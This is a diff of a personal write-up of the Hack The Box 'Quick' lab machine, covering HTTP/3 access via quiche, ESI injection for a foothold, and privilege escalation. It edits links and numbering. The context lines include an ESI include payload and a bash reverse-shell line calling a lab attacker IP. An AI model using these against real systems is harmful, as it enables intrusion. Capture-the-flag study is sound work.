@@ -2,7 +2,7 @@
 
 Quick is a hard difficulty Linux machine that features a website running on the  HTTP/3 protocol. Enumeration of the website reveals default credentials. The client portal is found to be vulnerable to ESI (Edge Side Includes) injection. This is used to obtain code execution and gain a foothold. A weak password gives access to a printer console, which permits the addition of new printers. Weak file permissions are exploited to move laterally. Plaintext credentials exposed in a configuration are reused to escalate to root. The official HTB writeup is below:
 
-[Quick.pdf](Quick%20(HTTP%203,%20Symlinks,%20ESI%20Injection)%20b191dc627ddb4687b87c5ba82acd5c1f/Quick.pdf)
+[Quick walkthrough](https://app.hackthebox.eu/machines/Quick/walkthroughs)
 
 ## Skills Learned:
 
@@ -16,7 +16,7 @@ Quick is a hard difficulty Linux machine that features a website running on the 
 
 1. **Installing Quiche**
 - Since you cannot connect to HTTP/3 via normal browsers like firefox or chrome, you have to use the QUIC protocol
-- You can use a client called quiche which can be found [here](https://developers.cloudflare.com/http3/intro/http3-client/)
+- You can use a client called quiche which can be found [here](https://github.com/cloudflare/quiche)
 - To install this client properly you need the correct version of rust and cargo and these can be installed using rustup
 
 ```
@@ -34,7 +34,7 @@ cargo build --examples
 cd target/debug/examples 
 ```
 
-1. **Foothold**
+2. **Foothold**
 - problem I ran into was getting the shell. the server from the attacker machine is supposed to be a PHP server because that one executes when it is connected to. run this with `sudo php -S 0.0.0.0:80`
 - make an empty `xml` file on your attacker machine eg `pwn.xml`
 - make the `esi.xsl` on your machine as well (same folder)
@@ -72,5 +72,5 @@ bash -i >& /dev/tcp/10.10.16.6/9001 0>&1
 </esi:include>
 ```
 
-- now run the search ticket query and the bash script will be made on the remote server
+- now run the search ticket query and the bash script will be made on the remote server.
 - edit the `esi.xsl` script on you machine to run the command that'll run the bash script and spawn a reverse shell.
